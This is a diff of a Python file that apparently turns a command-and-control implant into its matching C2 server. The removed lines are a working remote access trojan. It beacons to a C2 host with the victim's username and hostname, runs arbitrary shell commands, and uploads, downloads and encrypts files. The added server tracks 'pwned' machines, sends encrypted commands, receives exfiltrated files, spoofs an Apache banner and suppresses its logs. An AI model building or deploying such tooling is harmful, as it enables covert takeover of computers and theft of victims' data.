@@ -1,127 +1,141 @@
-from time import time, sleep
-from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
-from requests import get, post, exceptions, put
-from subprocess import run, PIPE, STDOUT
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from os import path, mkdir
+from urllib.parse import unquote_plus
+from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
-from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER,
-                      FILE_REQUEST, FILE_SEND, ZIP_PASSWORD)
-
-from os import getenv, chdir, getcwd, path
-
-client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
-          str(time()))
-
-encrypted_client = cipher.encrypt(client.encode()).decode()
+from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR,
+                      FILE_REQUEST, FILE_SEND, STORAGE)
 
 
-def post_to_server(message: str, response_path=RESPONSE):
-    try:
-        message = cipher.encrypt(message.encode())
-        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
-             headers=HEADER, proxies=PROXY)
-    except exceptions.RequestException:
+def get_new_session():
+    global active_session, pwned_dict, pwned_id, cwd
+
+    del pwned_dict[active_session]
+    cwd = "~"
+
+    if not pwned_dict:
+        print("Waiting for new connections.\n")
+        pwned_id = 0
+        active_session = 1
+    else:
+        while True:
+            print(*pwned_dict.items(), sep="\n")
+            try:
+                new_session = int(input("\nChoose a session number to make active: "))
+            except ValueError:
+                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
+                continue
+
+            if new_session in pwned_dict:
+                active_session = new_session
+                print(f"\nActive session is now: {pwned_dict[active_session]}")
+                break
+            else:
+                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
+                continue
+
+
+class C2Handler(BaseHTTPRequestHandler):
+    server_version = "Apache/2.4.58"
+    sys_version = "(CentOS)"
+
+    def do_GET(self):
+        global active_session, client_account, client_hostname, pwned_dict, pwned_id
+
+        if self.path.startswith(CMD_REQUEST):
+            client = self.path.split(CMD_REQUEST)[1]
+            client = cipher.decrypt(client.encode()).decode()
+            client_account = client.split('@')[0]
+            client_hostname = client.split('@')[1]
+
+            if client not in pwned_dict.values():
+                self.http_response(404)
+                pwned_id += 1
+                pwned_dict[pwned_id] = client
+                print(f"{client_account}@{client_hostname} has been pwned!\n")
+            elif client == pwned_dict[active_session]:
+                if INPUT_TIMEOUT:
+                    try:
+                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
+                                              timeout=INPUT_TIMEOUT)
+                    except TimeoutOccurred:
+                        command = KEEP_ALIVE_CMD
+                else:
+                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")
+                try:
+                    self.http_response(200)
+                    self.wfile.write(cipher.encrypt(command.encode()))
+                except BrokenPipeError:
+                    print(f"Lost connection to {pwned_dict[active_session]}.\n")
+                    get_new_session()
+                else:
+                    if command.startswith("client kill"):
+                        get_new_session()
+            else:
+                self.http_response(404)
+        elif self.path.startswith(FILE_REQUEST):
+            filepath = self.path.split(FILE_REQUEST)[1]
+            filepath = cipher.decrypt(filepath.encode()).decode()
+            try:
+                with open(f"{filepath}", "rb") as file_handle:
+                    self.http_response(200)
+                    self.wfile.write(cipher.encrypt(file_handle.read()))
+            except (FileNotFoundError, OSError):
+                print(f"{filepath} was not found on the c2 server.")
+                self.http_response(404)
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP GET.  Why?\n")
+
+    def do_POST(self):
+        if self.path == RESPONSE:
+            print(self.handle_post_data())
+        elif self.path == CWD_RESPONSE:
+            global cwd
+            cwd = self.handle_post_data()
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST.  Why?\n")
+
+    def do_PUT(self):
+      
+        if self.path.startswith(FILE_SEND + "/"):
+            self.http_response(200)
+            filename = self.path.split(FILE_SEND + "/")[1]
+            filename = cipher.decrypt(filename.encode()).decode()
+            incoming_file = STORAGE + "/" + filename
+            file_length = int(self.headers['Content-Length'])
+            with open(incoming_file, 'wb') as file_handle:
+                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
+            print(f"{incoming_file} has been written to the c2 server.")
+        else:
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT.  Why?\n")
+
+    def handle_post_data(self):
+        self.http_response(200)
+        content_length = int(self.headers.get("Content-Length"))
+        client_data = self.rfile.read(content_length)
+        client_data = client_data.decode()
+        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)
+        client_data = unquote_plus(client_data)
+        client_data = cipher.decrypt(client_data.encode()).decode()
+        return client_data
+
+    def http_response(self, code: int):
+        self.send_response(code)
+        self.end_headers()
+
+    def log_request(self, code="-", size="-"):
         return
 
 
-def get_third_item(input_string, replace=True):
-    try:
-        if replace:
-            return input_string.split()[2].replace("\\", "/")
-        else:
-            return input_string.split()[2]
-    except IndexError:
-        post_to_server(f"You must enter an argument after {input_string}.\n")
+active_session = 1
+cwd = "~"
+client_account = ""
+client_hostname = ""
+pwned_id = 0
+pwned_dict = {}
 
+if not path.isdir(STORAGE):
+    mkdir(STORAGE)
 
-while True:
-    try:
-        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
-        print(response.status_code)
-        if response.status_code == 404:
-            raise exceptions.RequestException
-    except exceptions.RequestException:
-        sleep(DELAY)
-        continue
-
-    command = cipher.decrypt(response.content).decode()
-
-    if command.startswith("cd "):
-        directory = command[3:]
-        try:
-            chdir(directory)
-        except FileNotFoundError:
-            post_to_server(f"{directory} was not found.\n")
-        except NotADirectoryError:
-            post_to_server(f"{directory} is not a directory.\n")
-        except PermissionError:
-            post_to_server(f"You do not have permissions to access {directory}.\n")
-        except OSError:
-            post_to_server("There was an operating system error on the client.\n")
-        else:
-            post_to_server(getcwd(), CWD_RESPONSE)
-
-    elif not command.startswith("client "):
-        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
-        post_to_server(command_output.decode())
-
-    elif command.startswith("client download"):
-        filepath = get_third_item(command)
-        if filepath is None:
-            continue
-        filename = path.basename(filepath)
-        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
-        try:
-            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER,
-                     proxies=PROXY) as response:
-                if response.status_code == 200:
-                    with open(filename, "wb") as file_handle:
-                        file_handle.write(cipher.decrypt(response.content))
-                    post_to_server(f"{filename} is now on {client}.\n")
-        except (FileNotFoundError, PermissionError, OSError):
-            post_to_server(f"Unable to write {filename} to disk on {client}.\n")
-
-    elif command.startswith("client upload"):
-        filepath = get_third_item(command)
-        if filepath is None:
-            continue
-        filename = path.basename(filepath)
-        encrypted_filename = cipher.encrypt(filename.encode()).decode()
-        try:
-            with open(filepath, "rb") as file_handle:
-                encrypted_file = cipher.encrypt(file_handle.read())
-                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True,
-                    proxies=PROXY, headers=HEADER)
-        except (FileNotFoundError, PermissionError, OSError):
-            post_to_server(f"Unable to access {filepath} on {client}.\n")
-
-    elif command.startswith("client zip"):
-        filepath = get_third_item(command)
-        if filepath is None:
-            continue
-        filename = path.basename(filepath)
-        try:
-            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
-                zip_file.setpassword(ZIP_PASSWORD)
-                if path.isdir(filepath):
-                    post_to_server(f"{filepath} on {client} is a directory.  Only files can be zipped.\n")
-                else:
-                    zip_file.write(filepath, filename)
-                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
-        except (FileNotFoundError, PermissionError, OSError):
-            post_to_server(f"Unable to access {filepath} on {client}.\n")
-
-    elif command.startswith("client kill"):
-        post_to_server(f"{client} has been killed.\n")
-        exit()
-
-    elif command.startswith("client sleep "):
-        try:
-            delay = float(command.split()[2])
-            if delay < 0:
-                raise ValueError
-        except (IndexError, ValueError):
-            post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
-        else:
-            post_to_server(f"{client} will sleep for {delay} seconds.\n")
-            sleep(delay)
-            post_to_server(f"{client} is now awake.\n")
+server = HTTPServer((BIND_ADDR, PORT), C2Handler)
+server.serve_forever()
